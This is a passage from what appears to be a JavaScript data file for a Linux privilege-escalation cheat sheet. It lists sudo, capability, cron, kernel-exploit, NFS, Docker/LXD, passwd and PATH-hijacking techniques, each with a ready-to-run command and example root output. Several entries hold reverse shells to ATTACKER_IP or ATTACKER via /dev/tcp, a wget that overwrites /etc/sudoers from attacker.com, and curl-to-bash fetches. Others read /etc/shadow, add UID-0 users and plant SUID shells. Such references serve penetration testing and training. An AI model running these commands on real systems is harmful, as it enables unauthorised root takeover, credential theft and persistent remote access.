      example_output: "root@target:~# whoami\nroot",
      tools: ["python", "python3", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/python/#sudo"]
    },
    {
      technique: "Sudo NOPASSWD Ruby",
      category: "Sudo Misconfigs",
      command: "sudo ruby -e 'exec \"/bin/bash\"'",
      description: "Ruby with sudo can exec a root shell.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["ruby", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/ruby/#sudo"]
    },
    {
      technique: "Sudo NOPASSWD Tar (wildcard)",
      category: "Sudo Misconfigs",
      command: "sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
      description: "Tar with sudo can execute commands via checkpoint actions.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["tar", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/tar/#sudo"]
    },
    {
      technique: "Sudo NOPASSWD Apache2",
      category: "Sudo Misconfigs",
      command: "sudo apache2 -f /etc/shadow",
      description: "Apache2 with sudo leaks file contents in error messages when pointed at non-config files.",
      example_output: "Syntax error on line 1 of /etc/shadow:\nInvalid command 'root:$6$salt$hash...'",
      tools: ["apache2", "sudo"],
      references: []
    },
    {
      technique: "Sudo LD_PRELOAD Exploit",
      category: "Sudo Misconfigs",
      command: "echo '#include <stdio.h>\\n#include <stdlib.h>\\nvoid _init() { unsetenv(\"LD_PRELOAD\"); setuid(0); system(\"/bin/bash -p\"); }' > /tmp/pe.c && gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles && sudo LD_PRELOAD=/tmp/pe.so /usr/bin/allowed_binary",
      description: "If sudo preserves LD_PRELOAD (env_keep+=LD_PRELOAD in sudoers), compile a shared library that spawns a root shell and preload it.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["gcc", "sudo"],
      references: []
    },
    {
      technique: "Sudo LD_LIBRARY_PATH Exploit",
      category: "Sudo Misconfigs",
      command: "ldd /usr/bin/allowed_binary  # find shared libs\ngcc -fPIC -shared -o /tmp/libfoo.so /tmp/pe.c\nsudo LD_LIBRARY_PATH=/tmp /usr/bin/allowed_binary",
      description: "If sudo preserves LD_LIBRARY_PATH, create a malicious version of a library used by the allowed binary.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["gcc", "ldd", "sudo"],
      references: []
    },
    {
      technique: "Sudo -u#-1 (CVE-2019-14287)",
      category: "Sudo Misconfigs",
      command: "sudo -u#-1 /bin/bash",
      description: "On sudo < 1.8.28, if sudoers has (ALL, !root), running as UID -1 (mapped to 0/root) bypasses the restriction. CVE-2019-14287.",
      example_output: "root@target:~# id\nuid=0(root) gid=0(root)",
      tools: ["sudo"],
      references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-14287"]
    },
    {
      technique: "Sudo SETENV + Path Injection",
      category: "Sudo Misconfigs",
      command: "echo '/bin/bash' > /tmp/cat && chmod +x /tmp/cat && sudo PATH=/tmp:$PATH /opt/script-that-calls-cat.sh",
      description: "If sudo is configured with SETENV or the script uses relative paths, inject a malicious binary via PATH.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["sudo"],
      references: []
    },
    {
      technique: "Sudo Wildcards in Script",
      category: "Sudo Misconfigs",
      command: "# If sudoers has: user ALL=(root) /opt/backup.sh *\nsudo /opt/backup.sh --checkpoint=1 --checkpoint-action=exec=sh",
      description: "Wildcard entries in sudoers allow injecting additional flags. Especially dangerous with tar, rsync, chmod, chown.",
      example_output: "# whoami\nroot",
      tools: ["sudo"],
      references: []
    },
    {
      technique: "Sudo Git",
      category: "Sudo Misconfigs",
      command: "sudo git -p help config\n!/bin/bash",
      description: "Git with sudo uses a pager that allows shell escape.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["git", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/git/#sudo"]
    },
    {
      technique: "Sudo Man",
      category: "Sudo Misconfigs",
      command: "sudo man man\n!/bin/bash",
      description: "Man with sudo uses less as pager, which allows shell escape.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["man", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/man/#sudo"]
    },
    {
      technique: "Sudo Zip",
      category: "Sudo Misconfigs",
      command: "sudo zip /tmp/x.zip /etc/hosts -T --unzip-command='sh -c /bin/bash'",
      description: "Zip with sudo executes commands via the unzip test command.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["zip", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/zip/#sudo"]
    },
    {
      technique: "Sudo Wget (overwrite)",
      category: "Sudo Misconfigs",
      command: "sudo wget http://attacker.com/sudoers -O /etc/sudoers",
      description: "Wget with sudo can overwrite /etc/sudoers with attacker-controlled version granting full root access.",
      example_output: "(sudoers file replaced)",
      tools: ["wget", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/wget/#sudo"]
    },
    {
      technique: "Sudo Systemctl",
      category: "Sudo Misconfigs",
      command: "sudo systemctl\n!sh",
      description: "Systemctl with sudo opens a pager for output. Shell escape with !sh.",
      example_output: "# whoami\nroot",
      tools: ["systemctl", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/systemctl/#sudo"]
    },
    {
      technique: "Sudo Journalctl",
      category: "Sudo Misconfigs",
      command: "sudo journalctl\n!/bin/bash",
      description: "Journalctl with sudo uses less as pager. Shell escape with !command.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["journalctl", "sudo"],
      references: ["https://gtfobins.github.io/gtfobins/journalctl/#sudo"]
    }
  ],

  capabilities: [
    {
      technique: "Find Capabilities",
      category: "Capabilities",
      command: "getcap -r / 2>/dev/null",
      description: "List all binaries with Linux capabilities set. Capabilities grant specific root powers without full SUID.",
      example_output: "/usr/bin/python3.8 = cap_setuid+ep\n/usr/bin/perl = cap_setuid+ep\n/usr/bin/ping = cap_net_raw+ep",
      tools: ["getcap"],
      references: ["https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities"]
    },
    {
      technique: "cap_setuid on Python",
      category: "Capabilities",
      command: "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
      description: "If Python has cap_setuid, call setuid(0) to become root, then spawn a shell.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["python3"],
      references: ["https://gtfobins.github.io/gtfobins/python/#capabilities"]
    },
    {
      technique: "cap_setuid on Perl",
      category: "Capabilities",
      command: "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'",
      description: "Perl with cap_setuid can call setuid(0) and exec a root shell.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["perl"],
      references: ["https://gtfobins.github.io/gtfobins/perl/#capabilities"]
    },
    {
      technique: "cap_setuid on Ruby",
      category: "Capabilities",
      command: "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
      description: "Ruby with cap_setuid can set UID to 0 and exec a shell.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["ruby"],
      references: []
    },
    {
      technique: "cap_setuid on PHP",
      category: "Capabilities",
      command: "php -r 'posix_setuid(0); system(\"/bin/bash\");'",
      description: "PHP with cap_setuid and posix extension can become root.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["php"],
      references: []
    },
    {
      technique: "cap_setuid on Node.js",
      category: "Capabilities",
      command: "node -e 'process.setuid(0); require(\"child_process\").execSync(\"/bin/bash\", {stdio: \"inherit\"})'",
      description: "Node.js with cap_setuid can set UID to 0 via process.setuid().",
      example_output: "root@target:~# whoami\nroot",
      tools: ["node"],
      references: []
    },
    {
      technique: "cap_net_raw for Sniffing",
      category: "Capabilities",
      command: "tcpdump -i eth0 -w /tmp/capture.pcap",
      description: "cap_net_raw allows raw socket access. Sniff network traffic for credentials.",
      example_output: "(capturing packets including potential cleartext credentials)",
      tools: ["tcpdump", "python3"],
      references: []
    },
    {
      technique: "cap_dac_override to Read Any File",
      category: "Capabilities",
      command: "python3 -c 'print(open(\"/etc/shadow\").read())'",
      description: "cap_dac_override bypasses file permission checks. Read /etc/shadow, SSH keys, or any file.",
      example_output: "root:$6$salt$hash:18000:0:99999:7:::",
      tools: ["python3", "cat"],
      references: []
    },
    {
      technique: "cap_sys_ptrace for Process Injection",
      category: "Capabilities",
      command: "python3 inject.py <root_process_pid>",
      description: "cap_sys_ptrace allows attaching to any process. Inject shellcode into a root process for escalation.",
      example_output: "(shellcode injected into root process, spawns reverse shell)",
      tools: ["python3", "gdb"],
      references: ["https://blog.pentesteracademy.com/privilege-escalation-by-injecting-process-with-python-2dc22e3f9a8"]
    },
    {
      technique: "cap_sys_admin for Mount Abuse",
      category: "Capabilities",
      command: "python3 -c 'import ctypes; libc = ctypes.CDLL(\"libc.so.6\"); libc.mount(b\"/dev/sda1\", b\"/mnt\", b\"ext4\", 0, 0)'",
      description: "cap_sys_admin allows mounting filesystems. Mount the root partition and access all files.",
      example_output: "(root filesystem mounted at /mnt with full access)",
      tools: ["python3", "mount"],
      references: []
    },
    {
      technique: "cap_fowner to Change Permissions",
      category: "Capabilities",
      command: "python3 -c 'import os; os.chmod(\"/etc/shadow\", 0o666)'",
      description: "cap_fowner allows changing file ownership/permissions. Make /etc/shadow world-readable.",
      example_output: "(shadow file now readable by all users)",
      tools: ["python3", "chmod"],
      references: []
    }
  ],

  cronAbuse: [
    {
      technique: "Writable Cron Script",
      category: "Cron Abuse",
      command: "echo '/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' >> /opt/scripts/backup.sh",
      description: "If a cron job runs a script you can write to, append a reverse shell. The job runs as the cron user (often root).",
      example_output: "(reverse shell received on next cron execution)",
      tools: ["echo", "nc"],
      references: []
    },
    {
      technique: "Cron PATH Hijacking",
      category: "Cron Abuse",
      command: "echo '#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /home/user/tar && chmod +x /home/user/tar",
      description: "If crontab sets PATH starting with a writable directory (like /home/user), create a script matching the name of a command the cron job calls (e.g., 'tar'). The cron job will run your version first.",
      example_output: "(/tmp/rootbash created with SUID bit on next cron run)",
      tools: [],
      references: []
    },
    {
      technique: "Tar Wildcard Injection",
      category: "Cron Abuse",
      command: "echo '' > '/var/www/html/--checkpoint=1' && echo '' > '/var/www/html/--checkpoint-action=exec=sh shell.sh'",
      description: "If a cron job runs 'tar czf backup.tar.gz *', filenames are interpreted as flags. Create files named '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' to execute arbitrary commands.",
      example_output: "(shell.sh executes as the cron user when tar runs)",
      tools: ["tar"],
      references: ["https://www.exploit-db.com/papers/33930"]
    },
    {
      technique: "Chown Wildcard Injection",
      category: "Cron Abuse",
      command: "echo '' > '/path/--reference=/etc/passwd'",
      description: "If a cron job runs 'chown user:group *', create a file named '--reference=/etc/passwd' to make chown copy ownership from /etc/passwd.",
      example_output: "(file ownership changed to match /etc/passwd owner — root)",
      tools: ["chown"],
      references: []
    },
    {
      technique: "Chmod Wildcard Injection",
      category: "Cron Abuse",
      command: "echo '' > '/path/--reference=/etc/shadow'",
      description: "Similar to chown wildcard injection. If cron runs 'chmod 600 *', use --reference to match permissions of a root-owned file.",
      example_output: "(permissions changed based on reference file)",
      tools: ["chmod"],
      references: []
    },
    {
      technique: "Rsync Wildcard Injection",
      category: "Cron Abuse",
      command: "echo '' > '/path/-e sh shell.sh'",
      description: "If a cron job runs 'rsync -a * dest/', create a file named '-e sh shell.sh' to execute a script.",
      example_output: "(shell.sh executes during rsync)",
      tools: ["rsync"],
      references: []
    },
    {
      technique: "Overwrite Cron Files",
      category: "Cron Abuse",
      command: "echo '* * * * * root /tmp/shell.sh' > /etc/cron.d/malicious",
      description: "If /etc/cron.d is writable, drop a new cron job that runs as root every minute.",
      example_output: "(shell.sh runs as root every minute)",
      tools: [],
      references: []
    },
    {
      technique: "Writable /etc/crontab",
      category: "Cron Abuse",
      command: "echo '* * * * * root /bin/bash /tmp/revshell.sh' >> /etc/crontab",
      description: "If /etc/crontab is writable, append a root cron job directly.",
      example_output: "(reverse shell every minute as root)",
      tools: [],
      references: []
    }
  ],

  kernelExploits: [
    {
      technique: "DirtyCow (CVE-2016-5195)",
      category: "Kernel Exploits",
      command: "gcc -pthread dirtycow.c -o dirtycow -lcrypt && ./dirtycow /etc/passwd newroot",
      description: "Race condition in copy-on-write. Affects Linux kernel < 4.8.3 (2.6.22 to 4.8.2). Overwrites read-only files, including /etc/passwd to add a root user.",
      example_output: "mmap 0xb7700000\nmadvise 0\nprocselfmem 1800\n(root user added to /etc/passwd)",
      tools: ["gcc"],
      references: ["https://dirtycow.ninja/", "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"]
    },
    {
      technique: "DirtyPipe (CVE-2022-0847)",
      category: "Kernel Exploits",
      command: "gcc dirtypipe.c -o dirtypipe && ./dirtypipe /usr/bin/su 1 $'\\x{0f}\\x{05}\\x{48}\\x{31}\\x{ff}'",
      description: "Overwrites data in arbitrary read-only files via pipe buffer page cache. Affects Linux kernel 5.8 to 5.16.10 (also 5.15.24, 5.10.101). Can modify SUID binaries or /etc/passwd.",
      example_output: "# whoami\nroot",
      tools: ["gcc"],
      references: ["https://dirtypipe.cm4all.com/", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"]
    },
    {
      technique: "PwnKit (CVE-2021-4034)",
      category: "Kernel Exploits",
      command: "gcc pwnkit.c -o pwnkit && ./pwnkit",
      description: "Memory corruption in polkit's pkexec. Affects ALL versions of polkit from May 2009 to Jan 2022 across all major Linux distros. The most reliable Linux LPE ever — almost guaranteed to work.",
      example_output: "# whoami\nroot",
      tools: ["gcc", "pkexec"],
      references: ["https://github.com/ly4k/PwnKit", "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"]
    },
    {
      technique: "GameOver(lay) (CVE-2023-2640 / CVE-2023-32629)",
      category: "Kernel Exploits",
      command: "unshare -rm sh -c 'mkdir l u w m && cp /u*/teleportation/l*/lib*.so.6 l/ && setcap cap_setuid+eip l/libcap.so.6 && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/* && u/libcap.so.6'",
      description: "Ubuntu-specific OverlayFS vulnerability. Affects Ubuntu kernels with the Ubuntu-specific OverlayFS patches. Gives instant root via capability manipulation.",
      example_output: "# whoami\nroot",
      tools: [],
      references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-2640"]
    },
    {
      technique: "Looney Tunables (CVE-2023-4911)",
      category: "Kernel Exploits",
      command: "python3 looney_tunables.py",
      description: "Buffer overflow in glibc's ld.so (GLIBC_TUNABLES). Affects glibc 2.34 to 2.38 on most major distros (Fedora 37-38, Ubuntu 22.04-23.04, Debian 12-13). Local privilege escalation to root.",
      example_output: "# whoami\nroot",
      tools: ["python3", "gcc"],
      references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-4911", "https://www.qualys.com/2023/10/03/cve-2023-4911/looney-tunables.txt"]
    },
    {
      technique: "Baron Samedit (CVE-2021-3156)",
      category: "Kernel Exploits",
      command: "sudoedit -s '\\' $(python3 -c 'print(\"A\"*65536)')",
      description: "Heap-based buffer overflow in sudo < 1.9.5p2 (also 1.8.2 to 1.8.31p2, 1.9.0 to 1.9.5p1). Affects all default sudo installs since July 2011. Run exploit for root shell.",
      example_output: "# whoami\nroot",
      tools: ["sudo", "python3", "gcc"],
      references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-3156", "https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt"]
    },
    {
      technique: "Netfilter Local Privilege Escalation (CVE-2023-32233)",
      category: "Kernel Exploits",
      command: "gcc exploit.c -o exploit -lmnl -lnftnl && ./exploit",
      description: "Use-after-free in Netfilter nf_tables. Affects Linux kernel 5.1 to 6.3.1. Requires CAP_NET_ADMIN in user namespace (available by default on Ubuntu/Debian).",
      example_output: "# whoami\nroot",
      tools: ["gcc"],
      references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-32233"]
    },
    {
      technique: "StackRot (CVE-2023-3269)",
      category: "Kernel Exploits",
      command: "gcc stackrot.c -o stackrot && ./stackrot",
      description: "Use-after-free in maple tree VM subsystem. Affects Linux kernel 6.1 to 6.4.0. Local privilege escalation.",
      example_output: "# whoami\nroot",
      tools: ["gcc"],
      references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-3269"]
    },
    {
      technique: "Kernel Exploit Suggester",
      category: "Kernel Exploits",
      command: "./linux-exploit-suggester.sh",
      description: "Automated tool that checks kernel version and suggests applicable exploits. Run on the target after getting initial access.",
      example_output: "[+] [CVE-2021-4034] PwnKit\n   Details: https://www.qualys.com/...\n   Exposure: highly probable\n   Tags: ubuntu=10.04-22.04\n[+] [CVE-2022-0847] DirtyPipe\n   Details: https://dirtypipe.cm4all.com/\n   Exposure: probable",
      tools: ["linux-exploit-suggester"],
      references: ["https://github.com/mzet-/linux-exploit-suggester"]
    }
  ],

  nfsExploits: [
    {
      technique: "Enumerate NFS Shares",
      category: "NFS",
      command: "showmount -e TARGET_IP",
      description: "List exported NFS shares on the target. Look for shares exported with no_root_squash.",
      example_output: "Export list for 10.10.10.5:\n/backup  *\n/home    *(rw,no_root_squash)",
      tools: ["showmount"],
      references: []
    },
    {
      technique: "Mount NFS Share",
      category: "NFS",
      command: "mkdir /tmp/nfs && mount -t nfs TARGET_IP:/home /tmp/nfs",
      description: "Mount the remote NFS share locally. If exported with no_root_squash, root on your machine = root on the share.",
      example_output: "(NFS share mounted at /tmp/nfs)",
      tools: ["mount"],
      references: []
    },
    {
      technique: "no_root_squash SUID Shell",
      category: "NFS",
      command: "cp /bin/bash /tmp/nfs/rootbash && chmod +s /tmp/nfs/rootbash  # on attacker as root\n# Then on target:\n/home/rootbash -p",
      description: "With no_root_squash, create a SUID bash on the share from your attacker machine (as root). Then execute it on the target for a root shell.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["cp", "chmod", "bash"],
      references: ["https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe"]
    },
    {
      technique: "no_root_squash C Payload",
      category: "NFS",
      command: "echo '#include <unistd.h>\\nint main(){setuid(0);setgid(0);execl(\"/bin/bash\",\"bash\",\"-p\",NULL);}' > /tmp/nfs/shell.c && gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell",
      description: "Alternative: compile a SUID C program on the NFS share that calls setuid(0) and spawns bash.",
      example_output: "# whoami\nroot",
      tools: ["gcc"],
      references: []
    }
  ],

  dockerLxdEscape: [
    {
      technique: "Docker Group Escalation",
      category: "Docker/LXD Escape",
      command: "docker run -v /:/mnt --rm -it alpine chroot /mnt bash",
      description: "If the current user is in the docker group, mount the entire host filesystem into a container and chroot into it. Full root access to the host.",
      example_output: "root@container:/# cat /etc/shadow\nroot:$6$salt$hash:...",
      tools: ["docker"],
      references: ["https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout"]
    },
    {
      technique: "Docker Socket Available",
      category: "Docker/LXD Escape",
      command: "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json",
      description: "If the Docker socket is accessible (mounted in container or world-readable), interact with Docker API directly for container escape.",
      example_output: "[{\"Id\":\"abc123\",\"Names\":[\"/web\"],\"Image\":\"nginx\",...}]",
      tools: ["curl", "docker"],
      references: []
    },
    {
      technique: "Docker SUID Shell via Mount",
      category: "Docker/LXD Escape",
      command: "docker run -v /:/mnt --rm alpine sh -c 'cp /mnt/bin/bash /mnt/tmp/rootbash && chmod +s /mnt/tmp/rootbash'\n/tmp/rootbash -p",
      description: "Use Docker to create a SUID bash on the host filesystem without entering the container interactively.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["docker"],
      references: []
    },
    {
      technique: "Docker Write to /etc/passwd",
      category: "Docker/LXD Escape",
      command: "docker run -v /etc/passwd:/mnt/passwd --rm alpine sh -c 'echo \"hacker:\\$1\\$salt\\$hash:0:0::/root:/bin/bash\" >> /mnt/passwd'",
      description: "Mount /etc/passwd into a container and append a root-equivalent user.",
      example_output: "(new root user added)",
      tools: ["docker"],
      references: []
    },
    {
      technique: "Docker Write Cron Job",
      category: "Docker/LXD Escape",
      command: "docker run -v /etc/cron.d:/mnt/cron --rm alpine sh -c 'echo \"* * * * * root bash -c \\\"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\\"\" > /mnt/cron/pwned'",
      description: "Mount /etc/cron.d and add a cron job that runs as root on the host.",
      example_output: "(reverse shell as root every minute)",
      tools: ["docker"],
      references: []
    },
    {
      technique: "LXD Group Escalation",
      category: "Docker/LXD Escape",
      command: "lxc image import alpine.tar.gz alpine.tar.gz.root --alias myimage\nlxc init myimage mycontainer -c security.privileged=true\nlxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\nlxc start mycontainer\nlxc exec mycontainer /bin/sh",
      description: "If in the lxd group, create a privileged container that mounts the host root filesystem. Full root access.",
      example_output: "# ls /mnt/root/etc/shadow\n/mnt/root/etc/shadow",
      tools: ["lxc", "lxd"],
      references: ["https://www.hackingarticles.in/lxd-privilege-escalation/"]
    },
    {
      technique: "LXD One-Liner",
      category: "Docker/LXD Escape",
      command: "lxc init ubuntu:22.04 privesc -c security.privileged=true && lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true && lxc start privesc && lxc exec privesc -- bash",
      description: "Quick LXD escalation using an official Ubuntu image (requires internet). Privileged container with host filesystem mounted.",
      example_output: "root@privesc:~# cat /mnt/root/etc/shadow\nroot:$6$...",
      tools: ["lxc"],
      references: []
    },
    {
      technique: "Container Escape via Privileged Mode",
      category: "Docker/LXD Escape",
      command: "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\nhost_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\necho \"$host_path/cmd\" > /tmp/cgrp/release_agent\necho '#!/bin/bash' > /cmd\necho 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /cmd\nchmod +x /cmd\nsh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'",
      description: "Escape from a privileged Docker container (--privileged flag) by abusing cgroup release_agent. Executes commands on the host.",
      example_output: "(reverse shell received from the host, not the container)",
      tools: [],
      references: ["https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/"]
    },
    {
      technique: "Disk Group — Read Raw Disk",
      category: "Docker/LXD Escape",
      command: "debugfs /dev/sda1\ndebugfs: cat /etc/shadow",
      description: "If in the disk group, use debugfs to read the raw filesystem. Access any file including /etc/shadow.",
      example_output: "root:$6$salt$hash:18000:0:99999:7:::",
      tools: ["debugfs", "dd"],
      references: []
    },
    {
      technique: "Adm Group — Read Logs",
      category: "Docker/LXD Escape",
      command: "cat /var/log/auth.log | grep -i pass",
      description: "The adm group can read /var/log/. Search logs for passwords, tokens, and other sensitive information.",
      example_output: "Jan  1 12:00:00 target sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/mysql -u root -pMyS3cretPass",
      tools: ["cat", "grep"],
      references: []
    }
  ],

  writablePasswd: [
    {
      technique: "Add Root User to /etc/passwd",
      category: "Writable /etc/passwd",
      command: "openssl passwd -1 -salt xyz password123\necho 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker",
      description: "If /etc/passwd is writable, add a new user with UID 0 (root-equivalent). Generate password hash with openssl.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["openssl", "echo", "su"],
      references: []
    },
    {
      technique: "Remove Root Password",
      category: "Writable /etc/passwd",
      command: "sed -i 's/root:x:/root::/' /etc/passwd\nsu root",
      description: "If /etc/passwd is writable, remove the 'x' in root's password field to allow passwordless su to root.",
      example_output: "root@target:~# whoami\nroot",
      tools: ["sed", "su"],
      references: []
    },
    {
      technique: "Generate Password Hash (SHA-512)",
      category: "Writable /etc/passwd",
      command: "python3 -c 'import crypt; print(crypt.crypt(\"password\", crypt.mksalt(crypt.METHOD_SHA512)))'",
      description: "Generate a proper SHA-512 password hash for insertion into /etc/passwd or /etc/shadow.",
      example_output: "$6$rounds=656000$randomsalt$longhashstring",
      tools: ["python3"],
      references: []
    }
  ],

  pathHijacking: [
    {
      technique: "PATH Hijacking — Relative Command",
      category: "PATH Hijacking",
      command: "echo '#!/bin/bash\\n/bin/bash -p' > /tmp/service && chmod +x /tmp/service && export PATH=/tmp:$PATH && /usr/local/bin/suid-binary",
      description: "If a SUID binary calls a command without an absolute path (e.g., 'service apache2 restart' instead of '/usr/sbin/service'), create a malicious version in a writable directory and prepend it to PATH.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["strings", "ltrace", "strace"],
      references: []
    },
    {
      technique: "Shared Library Hijacking",
      category: "PATH Hijacking",
      command: "ldd /usr/local/bin/suid-binary  # find loaded libraries\nreadelf -d /usr/local/bin/suid-binary | grep RPATH  # check RPATH\ngcc -shared -fPIC -o /writable/path/libevil.so evil.c",
      description: "If a SUID binary has an RPATH pointing to a writable directory, or loads a library from a writable path, create a malicious shared library.",
      example_output: "(SUID binary loads malicious library, executing code as root)",
      tools: ["ldd", "readelf", "gcc"],
      references: []
    },
    {
      technique: "Python Library Hijacking",
      category: "PATH Hijacking",
      command: "echo 'import os; os.system(\"/bin/bash -p\")' > /writable/path/imported_module.py",
      description: "If a Python script runs as root and imports from a writable directory (check sys.path), create a malicious module.",
      example_output: "bash-5.0# whoami\nroot",
      tools: ["python3"],
      references: []
    },
    {
      technique: "Systemd Timer/Service Abuse",
      category: "PATH Hijacking",
      command: "systemctl list-timers  # find writable service files\nfind /etc/systemd /lib/systemd -writable -type f 2>/dev/null",
      description: "If systemd service or timer unit files are writable, modify ExecStart to run a reverse shell.",
      example_output: "/etc/systemd/system/backup.service\n(modify ExecStart=/bin/bash /tmp/revshell.sh)",
      tools: ["systemctl", "find"],
      references: []
    }
  ],

  automatedTools: [
    {
      technique: "LinPEAS",
      category: "Automated Enumeration",
      command: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash",
      description: "The most comprehensive Linux privilege escalation enumeration script. Highlights findings with color codes: RED/YELLOW = 95% PE vector, red = important, green = info. Always run this first.",
      example_output: "(extensive color-coded output highlighting all potential escalation vectors)",
      tools: ["linpeas"],
      references: ["https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"]
    },
    {
      technique: "LinEnum",
      category: "Automated Enumeration",
      command: "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh -t",
      description: "Classic Linux enumeration script. Thorough output with optional detailed tests (-t flag).",
      example_output: "(enumeration results for kernel, users, SUID, cron, network, etc.)",
      tools: ["linenum"],
      references: ["https://github.com/rebootuser/LinEnum"]
    },
    {
      technique: "Linux Smart Enumeration (LSE)",
      category: "Automated Enumeration",
      command: "curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | bash -s -- -l 1",
      description: "Smart enumeration that shows progressively more info at higher levels (-l 0 = less, -l 2 = everything). Good for quick triage.",
      example_output: "(filtered enumeration results by verbosity level)",
      tools: ["lse"],
      references: ["https://github.com/diego-treitos/linux-smart-enumeration"]
    },
    {
      technique: "Unix-privesc-check",
      category: "Automated Enumeration",
      command: "./unix-privesc-check standard",
      description: "Checks for common privilege escalation misconfigurations. Standard or detailed mode.",
      example_output: "WARNING: /etc/passwd is world-writable\nWARNING: /opt/scripts/backup.sh is writable and called from cron",
      tools: ["unix-privesc-check"],
      references: ["https://pentestmonkey.net/tools/audit/unix-privesc-check"]
    },
    {
      technique: "Traitor — Automated PE",
      category: "Automated Enumeration",
      command: "./traitor -a",
      description: "Automatically identifies and exploits privilege escalation vectors. Goes beyond enumeration to actually attempt exploitation.",
      example_output: "[+] Attempting Docker socket escape...\n[+] Root shell obtained!",
      tools: ["traitor"],
      references: ["https://github.com/liamg/traitor"]
    },
    {
      technique: "GTFOBins Search",
      category: "Automated Enumeration",
      command: "# Manual check: for each SUID/sudo binary, check GTFOBins:\nfor bin in $(find / -perm -4000 -type f 2>/dev/null); do echo \"Checking $(basename $bin)\"; done",
      description: "Cross-reference every SUID binary and sudo-allowed command with GTFOBins for known escape techniques.",
      example_output: "Checking find → https://gtfobins.github.io/gtfobins/find/\nChecking vim → https://gtfobins.github.io/gtfobins/vim/",
      tools: [],
      references: ["https://gtfobins.github.io/"]
    }
  ]
};
